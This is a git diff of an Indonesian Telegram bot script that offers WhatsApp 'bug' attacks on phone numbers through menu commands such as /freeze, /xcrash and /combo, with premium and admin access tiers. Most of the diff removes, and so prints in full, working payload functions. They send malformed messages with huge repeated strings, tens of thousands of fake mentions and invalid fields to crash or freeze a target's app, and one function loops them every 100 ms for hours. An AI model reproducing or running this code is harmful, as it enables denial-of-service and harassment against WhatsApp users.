@@ -146,11 +146,11 @@ AKSES DITOLAK
 }
 
 function startBot() {
-  console.log(chalk.white(`
+  console.log(chalk.bold.red(`
 » Information:
 ☇ Developer : Ryanzz
 ☇ Script    : Exorcist Community
-☇ Version   : 1.5
+☇ Version   : 2.0
 `));
 }
 
@@ -1370,16 +1370,16 @@ bot.action('bugmenux', async (ctx) => {
 ┃ ▷ /freeze 62xx ⟶ 𝙵𝚁𝙴𝙴𝚉𝙴 𝙷𝙾𝙼𝙴
 ┃ ▷ /drain 62xx ⟶ ᴅᴇʟᴀʏ × ǫᴜᴏᴛᴀ ᴅʀᴀɪɴ
 ┃ ▷ /xcrash 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴
-┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
+┗━━━━━━━━━━━━━━━━━━━━━━━━┛
 
-┏━━━━━༺ ✦ 𝐇𝐀𝐑𝐃-𝐂𝐎𝐑𝐄 ✦ ༻━━━━┓
+┏━━━━━༺ ✦ 𝐇𝐀𝐑𝐃-𝐂𝐎𝐑𝐄 ✦ ༻━━┓
 ┃ ▷ /combo 62xx ⟶ 𝙲𝙾𝙼𝙱𝙾 𝙰𝙻𝙻 𝙱𝚄𝙶
 ┃ ▷ /hardelay 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟷
 ┃ ▷ /rimuru 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟸
 ┃ ▷ /vasion 62xx ⟶ 𝙳𝙴𝙻𝙰𝚈 × 𝙵𝚁𝙴𝙴𝚉𝙴
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 
-┏━━━━━༺ ⚠ 𝐍𝐎𝐓𝐄𝐒 ⚠ ༻━━━━┓
+┏━━━━━༺ ⚠ 𝐍𝐎𝐓𝐄𝐒 ⚠ ༻━━┓
 ┃ ⚠  sᴇɴᴅᴇʀ ᴡᴀᴊɪʙ ᴡᴀ ᴏʀɪ (ɴᴏ ʙɪsɴɪs)
 ┃ ⚠  ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴜɢ ʏ
 ┃ ⚠  ᴅɪᴊᴇᴅᴀ 𝟻/𝟷𝟶 ᴍɴᴛ ᴘᴇʀ ʙᴜɢ ɴʏᴀ.
@@ -1425,7 +1425,7 @@ bot.action('settingcmd', async (ctx) => {
 │ Developer : @Putxzyy
 │ Version   : 2.0 (Latest)
 │ Library   : JavaScript
-└──────────────────────┘
+└────────────────────┘
 
 ┌─〔 SETTINGS MENU 〕─┐
 │ /cekusersc → Cek pengguna script
@@ -1473,7 +1473,7 @@ bot.action('ownermenu', async (ctx) => {
 │ Developer : @Putxzyy
 │ Version   : 2.0 (Latest)
 │ Library   : JavaScript
-└──────────────────────┘
+└────────────────────┘
 
 ┌─〔 OWNER MENU 〕─┐
 │ /addprem [id] [30d]
@@ -1481,7 +1481,7 @@ bot.action('ownermenu', async (ctx) => {
 │ /addadmin [id]      
 │ /deladmin [id]
 │ /xconnect [no wa]
-└────────────────┘
+└──────────────┘
 </pre></blockquote>
 `;
   const mainKeyboard = [
@@ -1521,7 +1521,7 @@ bot.action('main_menu', async (ctx) => {
 ║ ⚝ ᴅᴇᴠ      : @Putxzyy
 ║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
 ║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
-╚════════════════════╝
+╚═══════════════════╝
 </pre></blockquote>
 `;
 
@@ -1553,628 +1553,18 @@ bot.action('main_menu', async (ctx) => {
 });
 
 //func bug disini//////
-async function protocolbug8(isTarget, mention) {
-    const mentionedList = [
-        "13135550002@s.whatsapp.net",
-        ...Array.from({ length: 40000 }, () =>
-            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-        )
-    ];
 
-    const embeddedMusic = {
-        musicContentMediaId: "589608164114571",
-        songId: "870166291800508",
-        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
-        title: "Apollo X ",
-        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
-        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
-        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
-        artistAttribution: "https://www.instagram.com/_u/xrelly",
-        countryBlocklist: true,
-        isExplicit: true,
-        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
-    };
 
-    const videoMessage = {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
-        mimetype: "video/mp4",
-        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
-        fileLength: "1515940",
-        seconds: 14,
-        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
-        height: 1280,
-        width: 720,
-        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
-        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1748276788",
-        contextInfo: { isSampled: true, mentionedJid: mentionedList },
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363321780343299@newsletter",
-            serverMessageId: 1,
-            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
-        },
-        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
-        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
-        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
-        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
-        annotations: [{
-            embeddedContent: { embeddedMusic },
-            embeddedAction: true
-        }]
-    };
 
-        const stickerMessage = {
-        stickerMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-            mimetype: "image/webp",
-            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-            fileLength: { low: 1, high: 0, unsigned: true },
-            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
-            firstFrameLength: 19904,
-            firstFrameSidecar: "KN4kQ5pyABRAgA==",
-            isAnimated: true,
-            isAvatar: false,
-            isAiSticker: false,
-            isLottie: false,
-            contextInfo: {
-                mentionedJid: mentionedList
-            }
-        }
-    };
 
-    const audioMessage = {
-        audioMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
-            mimetype: "audio/mpeg",
-            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
-            fileLength: "389948",
-            seconds: 24,
-            ptt: false,
-            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
-            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
-            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
-        }
-    };
 
-    const msg1 = generateWAMessageFromContent(isTarget, {
-        viewOnceMessage: { message: { videoMessage } }
-    }, {});
-    
-    const msg2 = generateWAMessageFromContent(isTarget, {
-        viewOnceMessage: { message: stickerMessage }
-    }, {});
 
-    const msg3 = generateWAMessageFromContent(isTarget, audioMessage, {});
 
-    // Relay all messages
-    for (const msg of [msg1, msg2, msg3]) {
-        await CosmoX.relayMessage("status@broadcast", msg.message, {
-            messageId: msg.key.id,
-            statusJidList: [isTarget],
-            additionalNodes: [{
-                tag: "meta",
-                attrs: {},
-                content: [{
-                    tag: "mentioned_users",
-                    attrs: {},
-                    content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
-                }]
-            }]
-        });
-    }
 
-    if (mention) {
-        await CosmoX.relayMessage(isTarget, {
-            statusMentionMessage: {
-                message: {
-                    protocolMessage: {
-                        key: msg1.key,
-                        type: 25
-                    }
-                }
-            }
-        }, {
-            additionalNodes: [{
-                tag: "meta",
-                attrs: { is_status_mention: "true" },
-                content: undefined
-            }]
-        });
-    }
-}        
 
-async function InvisibleFC(CosmoX, target) {
-  try {
-    let message = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "OTAX",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: -999.035,
-                degreesLongitude: 922.999999999999,
-                name: "OTAX",
-                address: "\u200D",
-              },
-            },
-            body: {
-              text: "OTAX",
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-            },
-            contextInfo: {
-              participant: target,
-              mentionedJid: ["0@s.whatsapp.net"],
-            },
-          },
-        },
-      },
-    };
 
-    await CosmoX.relayMessage(target, message, {
-      messageId: null,
-      participant: { jid: target },
-      userJid: target,
-    });
-  } catch (err) {
-    console.log(err);
-  }
-}
 
-async function bulldozer1TB(CosmoX, target) {
-  const SID = "5e03e0&mms3";
-  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
-  const type = "image/webp";
 
-  const FIVETEN_GB = 15 * 32124 * 32124 * 32124; // 5gb dalam byte
-  const TOTAL_GB = 32124; // Total 1 tera byte
-  const ITERATIONS = TOTAL_GB / 15; // 15GB per mili detik 
-
-  for (let i = 0; i < ITERATIONS; i++) {
-    const extraPayload = 'KONTOL'.repeat(999999999); 
-
-    const message = {
-      viewOnceMessage: {
-        message: {
-          stickerMessage: {
-            url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
-            fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
-            fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
-            mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
-            mimetype: type,
-            directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
-            fileLength: { low: 5242880000, high: 0, unsigned: true }, // 5GB
-            mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
-            firstFrameLength: 19904,
-            firstFrameSidecar: "KN4kQ5pyABRAgA==",
-            isAnimated: true,
-            contextInfo: {
-              participant: target,
-              mentionedJid: ["0@s.whatsapp.net"],
-              groupMentions: [],
-              entryPointConversionSource: "non_contact",
-              entryPointConversionApp: "whatsapp",
-              entryPointConversionDelaySeconds: 999999,
-            },
-            stickerSentTs: { low: -10000000, high: 999, unsigned: false },
-            isAvatar: true,
-            isAiSticker: true,
-            isLottie: true,
-            extraPayload, 
-          },
-        },
-      },
-    };
-
-    const msg = generateWAMessageFromContent(target, message, {});
-    await CosmoX.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-    });
-
-    console.log(`Sent ${(i + 1) * 5}GB to ${target}`);
-  }
-}
-
-async function FrizHome(isTarget) { 
-const msg = await generateWAMessageFromContent(isTarget, {
-    listMessage: {
-      title: "holaa" + "ꦾ".repeat(166666),
-      description: 'I am Yukina Devils',
-      footerText: "ꦾ".repeat(166666),
-      listType: 2,
-      productListInfo: {
-        productSections: [
-          {
-            title: "LIST_PRODUCT",
-            products: [Array(9000).fill(0).map(() => ({ productId: "999999999999999" }))]
-          }
-        ],
-        headerImage: {
-          productId: "999999999999999",
-          jpegThumbnail: null
-        },
-        businessOwnerJid: "0@s.whatsapp.net"
-      }
-    }
-  }, {});
-await CosmoX.relayMessage(isTarget, msg.message, {
-   messageId: msg.key.id
-  });
-}
-
-async function Crash(target) {
-  const cardsX = {
-    header: {
-      imageMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
-        mimetype: "image/jpeg",
-        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
-        fileLength: "211396",
-        height: 816,
-        width: 654,
-        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
-        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
-        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1749220174",
-        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
-      },
-      hasMediaAttachment: true
-    },
-    body: {
-      text: ""
-    },
-    nativeFlowMessage: {
-      messageParamsJson: "{ X.json }"
-    }
-  };
-
-  const message = {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            hasMediaAttachment: false
-          },
-          body: {
-            text: ""
-          },
-          footer: {
-            text: ""
-          },
-          carouselMessage: {
-            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
-          },
-          contextInfo: {
-            participant: target,
-            quotedMessage: {
-              viewOnceMessage: {
-                message: {
-                  interactiveResponseMessage: {
-                    body: {
-                      text: "Sent",
-                      format: "DEFAULT"
-                    },
-                    nativeFlowResponseMessage: {
-                      name: "galaxy_message",
-                      paramsJson: "{ X.json }",
-                      version: 3
-                    }
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  };
-
-  await CosmoX.relayMessage(target, message, { messageId: null });
-}
-
-async function invisihard3(target, mention) {
-    const mentionedList = [
-        "13135550002@s.whatsapp.net",
-        ...Array.from({ length: 40000 }, () =>
-            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-        )
-    ];
-
-    const embeddedMusic = {
-        musicContentMediaId: "589608164114571",
-        songId: "870166291800508",
-        author: ".Cosmo" + "釤勧煗".repeat(10000),
-        title: "CosmoNenen",
-        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
-        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
-        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
-        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
-        countryBlocklist: true,
-        isExplicit: true,
-        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
-    };
-
-    const videoMessage = {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-        mimetype: "video/mp4",
-        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-        fileLength: "289511",
-        seconds: 15,
-        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-        caption: "BWAHAHAHAHAHA",
-        height: 640,
-        width: 640,
-        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1743848703",
-        contextInfo: {
-            isSampled: true,
-            mentionedJid: mentionedList
-        },
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363321780343299@newsletter",
-            serverMessageId: 1,
-            newsletterName: "嗉苦紤釡惩犕燱HAHA饾棝汰饾棞态HAHAHA幄垛儫"
-        },
-        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-        annotations: [
-            {
-                embeddedContent: {
-                    embeddedMusic
-                },
-                embeddedAction: true
-            }
-        ]
-    };
-
-    const msg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: { videoMessage }
-        }
-    }, {});
-
-    await CosmoX.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
-            {
-                tag: "meta",
-                attrs: {},
-                content: [
-                    {
-                        tag: "mentioned_users",
-                        attrs: {},
-                        content: [
-                            { tag: "to", attrs: { jid: target }, content: undefined }
-                        ]
-                    }
-                ]
-            }
-        ]
-    });
-
-    if (mention) {
-        await CosmoX.relayMessage(target, {
-            statusMentionMessage: {
-                message: {
-                    protocolMessage: {
-                        key: msg.key,
-                        type: 25
-                    }
-                }
-            }
-        }, {
-            additionalNodes: [
-                {
-                    tag: "meta",
-                    attrs: { is_status_mention: "true" },
-                    content: undefined
-                }
-            ]
-        });
-    }
-}
-
-async function protocolbug7(isTarget, mention) {
-  const floods = 40000;
-  const mentioning = "13135550002@s.whatsapp.net";
-  const mentionedJids = [
-    mentioning,
-    ...Array.from({ length: floods }, () =>
-      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-    )
-  ];
-
-  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
-  const mime = "audio/mpeg";
-  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
-  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
-  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
-  const timestamp = 99999999999999;
-  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
-  const longs = 99999999999999;
-  const loaded = 99999999999999;
-  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";
-
-  const messageContext = {
-    mentionedJid: mentionedJids,
-    isForwarded: true,
-    forwardedNewsletterMessageInfo: {
-      newsletterJid: "120363321780343299@newsletter",
-      serverMessageId: 1,
-      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
-    }
-  };
-
-  const messageContent = {
-    ephemeralMessage: {
-      message: {
-        audioMessage: {
-          url: links,
-          mimetype: mime,
-          fileSha256: sha,
-          fileLength: longs,
-          seconds: loaded,
-          ptt: true,
-          mediaKey: key,
-          fileEncSha256: enc,
-          directPath: path,
-          mediaKeyTimestamp: timestamp,
-          contextInfo: messageContext,
-          waveform: data
-        }
-      }
-    }
-  };
-
-  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });
-
-  const broadcastSend = {
-    messageId: msg.key.id,
-    statusJidList: [isTarget],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              { tag: "to", attrs: { jid: isTarget }, content: undefined }
-            ]
-          }
-        ]
-      }
-    ]
-  };
-
-  await CosmoX.relayMessage("status@broadcast", msg.message, broadcastSend);
-
-  if (mention) {
-    await CosmoX.relayMessage(isTarget, {
-      groupStatusMentionMessage: {
-        message: {
-          protocolMessage: {
-            key: msg.key,
-            type: 25
-          }
-        }
-      }
-    }, {
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {
-          is_status_mention: " null - exexute "
-        },
-        content: undefined
-      }]
-    });
-  }
-}
-
-async function ApiBug(durationHours, target) { 
-const totalDurationMs = durationHours * 60 * 60 * 1000;
-const startTime = Date.now(); let count = 0;
-
-const sendNext = async () => {
-        if (Date.now() - startTime >= totalDurationMs) {
-        console.log(`Stopped after sending ${count} messages`);
-        return;
-       }
-
-        try {
-    if (count < 400) {
-        await Promise.all([
-            protocolbug7(target, false),
-            protocolbug8(target, false),
-            InvisibleFC(CosmoX, target),
-          ]);
-        console.log(chalk.blue(`API BUG (DELAY)${count}/400 ke ${target}`));
-        count++;
-        setTimeout(sendNext, 100);
-    } else {
-        console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
-        count = 0;
-        console.log(chalk.red("➡️ Next 400 Messages"));
-        setTimeout(sendNext, 100);
-    }
-} catch (error) {
-    console.error(`❌ Error saat mengirim: ${error.message}`);
-    setTimeout(sendNext, 100);
-}
-};
-
-sendNext();
-
-}
-
-async function robustfreeze(target, Ptcp = true) {
-  try {
-    await CosmoX.relayMessage(
-      target,
-      {
-        ephemeralMessage: {
-          message: {
-            interactiveMessage: {
-              header: {
-                locationMessage: {
-                  degreesLatitude: 0,
-                  degreesLongitude: 0,
-                },
-                hasMediaAttachment: true,
-              },
-              body: {
-                text:
-                  "Anafabula here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
-                  "ꦽ".repeat(92000) +
-                  `@1`.repeat(92000),
-              },
-              nativeFlowMessage: {},
-              contextInfo: {
-                mentionedJid: [
-                  "1@newsletter",
-                  "1@newsletter",
-                  "1@newsletter",
-                  "1@newsletter",
-                  "1@newsletter",
-                ],
-                groupMentions: [
-                  {
-                    groupJid: "1@newsletter",
-                    groupSubject: "Vamp",
-                  },
-                ],
-                quotedMessage: {
-                  documentMessage: {
-                    contactVcard: true,
-                  },
-                },
-              },
-            },
-          },
-        },
-      },
-      {
-        participant: { jid: target },
-        userJid: target,
-      }
-    );
-  } catch (err) {
-    console.log(err);
-  }
-}
 
 // --- Jalankan Bot ---
 bot.launch();
-console.log("Telegram bot is running...");
